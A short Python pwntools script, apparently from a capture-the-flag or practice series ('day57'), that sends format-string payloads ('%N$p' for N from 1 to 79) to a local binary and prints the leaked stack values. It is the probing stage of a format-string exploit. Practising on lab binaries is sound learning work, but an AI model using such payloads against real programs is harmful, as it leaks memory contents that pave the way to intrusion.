from pwn import * 

context.binary = "./day57_p2_hard"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day57_p2_hard")
	p.recvuntil(b"stage:\n")
	payload = f"%{i}$p".encode()
	p.sendline(payload)
	out = p.recvline()
	
	print(i ,out)
	p.close()
